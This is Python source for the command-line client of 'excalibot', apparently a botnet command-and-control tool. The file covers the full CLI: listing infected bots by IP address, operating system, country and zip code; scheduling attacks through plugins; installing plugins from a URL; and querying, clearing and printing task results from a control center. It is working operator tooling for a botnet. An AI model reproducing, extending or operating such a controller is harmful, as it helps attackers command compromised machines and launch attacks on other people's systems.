#!/usr/bin/env python
from classes.operations import Operations


class Options:
    @staticmethod
    def help(args):
        # Describe usage of the cli
        if len(args) == 0:
            print('Usage: excalibot help COMMAND')
            print('General application usage: excalibot COMMAND HOST PORT PARAMETERS')
            print('COMMAND:')
            print('  help\t\tPrint usage')
            print('  list\t\tList available bots')
            print('  attack\tSchedule new attacks')
            print('  install\tInstall new plugin')
            print('  status\tCheck task completion status')
            print('  clear\t\tClear task from control center')
            print('  output\t\tPrint task output')
        elif args[0] == 'list':
            print('List available bots')
            print('Usage: excalibot list HOST PORT key:KEY since:SINCE')
            print('KEY: (optional)')
            print('  id\t\tSort list by botid')
            print('  ipAddress\tSort list by IP address')
            print('  lastSeen\tSort list by seconds since last report')
            print('  os\t\tSort list by Operative System')
            print('  countryCode\tSort list by Country')
            print('  zip\t\tSort list by zip code')
            print()
            print('SINCE: (optional)')
            print('  Show only bots alive in the last SINCE seconds')
        elif args[0] == 'attack':
            print('Schedule new attacks')
            print('Usage: excalibot attack HOST PORT ATTACK KEY:VALUE')
            print('ATTACK:')
            print('  Installed plugin name')
            print()
            print('KEY:VALUE: (optional)')
            print('  List of parameters to the attack, in a key:value format')
            # TODO get plugins from server
        elif args[0] == 'install':
            print('Install new plugin')
            print('Usage: excalibot install HOST PORT URL')
            print('URL:')
            print('  url to the plugin resource')
        elif args[0] == 'status':
            print('Check task completion status')
            print('Usage: excalibot status HOST PORT ID -b')
            print('ID:')
            print('  id of the task to get status')
            print()
            print('-b: (optional)')
            print('  Block until task is completed')
        elif args[0] == 'clear':
            print('Clear task from control center')
            print('Usage: excalibot clear HOST PORT ID')
            print('ID:')
            print('  Id of the task to deleted')
        elif args[0] == 'output':
            print('Print task output')
            print('Usage: excalibot output HOST PORT ID')
            print('ID:')
            print('  Id of the task to get output')

    @staticmethod
    def list(args):
        # List available bots {list $host $port key:$key since:$time}
        if len(args) < 2:
            print('Invalid parameters')
            return
        try:
            param = {}
            if len(args) > 2:
                param = Operations.hash_args(args[2:])
            if 'since' in param.keys():
                bot_list = Operations.list_alive(args[0], args[1], param['since'])
            else:
                bot_list = Operations.list(args[0], args[1])
            if bot_list == -1:
                print('Error Connecting')
                return
            if 'key' not in param.keys() or param['key'] not in ['id', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']:
                bot_list = Operations.sort(bot_list, 'lastSeen')
            else:
                bot_list = Operations.sort(bot_list, param['key'])
            Operations.print_list(bot_list)
        except:
            print("Error connecting")

    @staticmethod
    def attack(args):
        # Request attack {attack $host $port $attack [$parameters]}
        if len(args) < 3:
            print('Invalid parameters')
            return
        param = {}
        if len(args) > 3:
            param = Operations.hash_args(args[3:])
        try:
            if param == -1:
                print('Invalid attack parameters')
                return
            Operations.post_attack(args[0], args[1], args[2], param)
        except:
            print("Error connecting")

    @staticmethod
    def install(args):
        # Install new plugin {install $host $port $url}
        if len(args) < 3:
            print('Invalid parameters')
            return
        try:
            response = Operations.install(args[0], args[1], args[2])
            if response == -1:
                print('Invalid install parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")

    @staticmethod
    def status(args):
        # Check task completion status {status $host $port $id ($-b)}
        if len(args) < 3:
            print('Invalid parameters')
            return
        block = True
        try:
            while block:
                response = Operations.status(args[0], args[1], args[2])
                if len(args) > 3 and args[3] == '-b':
                    block = Operations.block(response)
                else:
                    block = False
            if response == -1:
                print('Invalid status parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")

    @staticmethod
    def clear(args):
        # Clear task from control center {clear $host $port $id}
        if len(args) < 3:
            print('Invalid parameters')
            return
        try:
            response = Operations.clear(args[0], args[1], args[2])
            if response == -1:
                print('Invalid clear parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")

    @staticmethod
    def output(args):
        # Clear task from control center {output $host $port $id}
        if len(args) < 3:
            print('Invalid parameters')
            return
        try:
            response = Operations.output(args[0], args[1], args[2])
            if response == -1:
                print('Invalid output parameters')
                return
            else:
                print(response)
        except:
            print("Error connecting")
